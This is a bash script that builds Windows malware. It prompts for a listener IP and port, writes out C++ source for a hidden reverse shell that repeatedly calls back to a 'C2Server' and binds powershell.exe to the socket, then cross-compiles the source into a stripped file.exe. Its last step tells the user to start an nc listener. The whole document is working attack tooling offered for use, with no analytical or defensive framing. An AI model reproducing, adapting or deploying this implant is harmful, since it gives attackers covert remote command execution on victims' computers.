#!/bin/bash
clear
echo "**************************************************************************************"
echo " Automatic C++ source code generator/compiler "
echo " 99.9% code by Paranoid Ninja "
echo " 0.1% code by Astr0 Baby " 
echo " PE32+ executable (GUI) x86-64 "
echo "**************************************************************************************"

echo -en 'Listener server IP : ' 
read ip
echo -en 'Listener port number : ' 
read port

cat <<EOF > final.cpp
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell(char* C2Server, int C2Port) {
while(true) {
Sleep(5000); // 1000 = One Second

SOCKET mySocket;
sockaddr_in addr;
WSADATA version;
WSAStartup(MAKEWORD(2,2), &version);
mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
addr.sin_family = AF_INET;

addr.sin_addr.s_addr = inet_addr(C2Server); //IP received from main function
addr.sin_port = htons(C2Port); //Port received from main function

//Connecting to Proxy/ProxyIP/C2Host
if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
closesocket(mySocket);
WSACleanup();
continue;
}
else {
char RecvData[DEFAULT_BUFLEN];
memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
continue;
}
else {
char Process[] = "powershell.exe";
STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;
memset(&sinfo, 0, sizeof(sinfo));
sinfo.cb = sizeof(sinfo);
sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
WaitForSingleObject(pinfo.hProcess, INFINITE);
CloseHandle(pinfo.hProcess);
CloseHandle(pinfo.hThread);

memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
continue;
}
if (strcmp(RecvData, "exit\n") == 0) {
exit(0);
}
}
}
}
}

int main(int argc, char **argv) {
FreeConsole();
if (argc == 3) {
int port = atoi(argv[2]); //Converting port in Char datatype to Integer format
RunShell(argv[1], port);
}
else {
char host[] = "IPGOESHERE";
int port = PORTGOESHERE;
RunShell(host, port);
}
return 0;
}
EOF
sed -i -e "s/IPGOESHERE/$ip/g" final.cpp 
sed -i -e "s/PORTGOESHERE/$port/g" final.cpp

echo "[-] Compiling code .."
x86_64-w64-mingw32-g++ final.cpp -o file.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

if [ $? -eq 0 ]; then
	echo "[*] Done ! " 
	ls -la file.exe 
else
	echo "[-] Failed, please check if you have proper mingw32-g++ installed " 
fi
echo "[-] Now start a local nc listener like this nc -lnvp $port"
